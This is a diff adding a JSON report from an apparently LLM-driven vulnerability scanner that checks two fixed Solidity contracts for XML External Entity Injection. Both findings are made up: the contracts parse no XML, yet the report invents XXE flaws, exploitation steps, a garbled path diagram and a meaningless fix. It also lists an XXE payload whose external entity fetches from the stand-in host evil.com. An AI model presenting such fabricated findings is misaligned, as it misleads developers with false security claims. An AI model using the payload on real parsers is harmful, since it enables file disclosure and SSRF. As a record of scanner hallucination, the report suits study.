@@ -1,0 +1,140 @@
+{
+  "schema_version": 5,
+  "report_type": "vulnerability",
+  "title": "XML External Entity Injection Security Analysis",
+  "generated_at": "2026-06-11 11:00:31",
+  "model_name": "mistral:latest",
+  "language": "en",
+  "vulnerability_name": "XML External Entity Injection",
+  "vulnerability": {
+    "name": "XML External Entity Injection",
+    "description": "Attacks against applications that parse XML input",
+    "patterns": [
+      "XML parser without entity restrictions",
+      "XML processing without disabling DTD",
+      "DocumentBuilder without secure settings",
+      "SAX parser with default configuration",
+      "XmlReader without proper settings",
+      "SOAP message parsing",
+      "external entity resolution enabled",
+      "XXE vulnerability",
+      "unsafe DOM parser",
+      "XML libraries with dangerous defaults",
+      "libxml2 without noent",
+      "XMLReader with external entities",
+      "XmlDocument with DTD processing",
+      "insecure XML deserialization",
+      "XML with custom entity handling",
+      "JAXP without secure processing",
+      "untrusted DOCX/XLSX processing",
+      "SVG with embedded XXE",
+      "RSS/Atom feed parsing vulnerability",
+      "XML without schema validation",
+      "XSLT processing with external entities",
+      "XPath evaluation with untrusted XML",
+      "XML bomb vulnerability",
+      "XML parser with custom resolvers"
+    ],
+    "impact": "File disclosure, SSRF, denial of service, or data theft",
+    "mitigation": "Disable DTDs and external entities in XML parsers, validate and sanitize inputs"
+  },
+  "files": [
+    {
+      "file_path": "/work/project/dataset/clean/modifier_reentrancy_fixed.sol",
+      "similarity_score": 0.615432715289567,
+      "chunk_analyses": [
+        {
+          "findings": [
+            {
+              "title": "XML External Entity Injection vulnerability",
+              "vulnerable_code": "bank = new Bank();",
+              "explanation": "The 'Bank' constructor calls an external contract, which may be vulnerable to XML External Entity Injection.",
+              "severity": "Medium",
+              "impact": "Potential remote code execution or data theft",
+              "entry_point": "/constructors/Bank",
+              "execution_path_diagram": "```\n  +---+\n  | Bank |\n  +---+-\n       ^     \n       |     \n  +---+-\n  | ModifierEntrancy|\n  +---+---\n```",
+              "http_methods": [],
+              "manipulable_parameters": [
+                "contract"
+              ],
+              "exploitation_steps": [
+                "Create an XML file containing a malicious DTD and reference it in the 'contract' parameter",
+                "Invoke the constructor, passing the malicious XML file as the 'contract'",
+                "Exploit the XML External Entity Injection to execute arbitrary code"
+              ],
+              "example_payloads": [
+                "<!ENTITY evil_script SYSTEM 'http://evil.com/malicious.xml'>",
+                "<Bank>&evil_script;"
+              ],
+              "exploitation_conditions": "Attacker can provide the 'contract' parameter.",
+              "remediation": "Disable DTD processing and sanitize input when constructing contracts",
+              "secure_code_example": "bank = new Bank({/* sanitized XML file */});",
+              "snippet_start_line": 17,
+              "snippet_end_line": 17,
+              "http_raw_requests": []
+            }
+          ],
+          "start_line": 1,
+          "end_line": 42,
+          "notes": null,
+          "validation_error": false,
+          "potential_vulnerabilities": false,
+          "truncated": false
+        }
+      ],
+      "error": null
+    },
+    {
+      "file_path": "/work/project/dataset/clean/simple_dao_fixed.sol",
+      "similarity_score": 0.5834970285687097,
+      "chunk_analyses": [
+        {
+          "findings": [
+            {
+              "title": "Vulnerability found",
+              "vulnerable_code": "donate(address to) payable public{\n  credit[to] += msg.value;\n}",
+              "explanation": "The contract is not validating and sanitizing user-provided input, making it vulnerable to XML External Entity Injection.",
+              "severity": "Medium",
+              "impact": "An attacker can potentially manipulate the contract's credit assignment function.",
+              "entry_point": "donate function",
+              "execution_path_diagram": "   - User calls donate(address to) with malicious XML data\n   - Contract parses and processes external entities in XML data",
+              "http_methods": [],
+              "manipulable_parameters": [
+                "to"
+              ],
+              "exploitation_steps": [
+                "- Send maliciously crafted XML input to the donate function"
+              ],
+              "example_payloads": [],
+              "exploitation_conditions": "None",
+              "remediation": "Validate and sanitize user-provided inputs before processing them.",
+              "secure_code_example": "",
+              "snippet_start_line": 20,
+              "snippet_end_line": 20,
+              "http_raw_requests": []
+            }
+          ],
+          "start_line": 1,
+          "end_line": 34,
+          "notes": "Code is written in Solidity, an Ethereum smart contract programming language",
+          "validation_error": false,
+          "potential_vulnerabilities": false,
+          "truncated": false
+        }
+      ],
+      "error": null
+    }
+  ],
+  "stats": {
+    "files_analyzed": 2,
+    "high_risk": 0,
+    "medium_risk": 2,
+    "low_risk": 0,
+    "critical_risk": 0,
+    "total_findings": 2,
+    "potential_findings": 0
+  },
+  "analysis_root": "../clean",
+  "embed_model": "nomic-embed-text",
+  "project": "clean_contracts"
+}
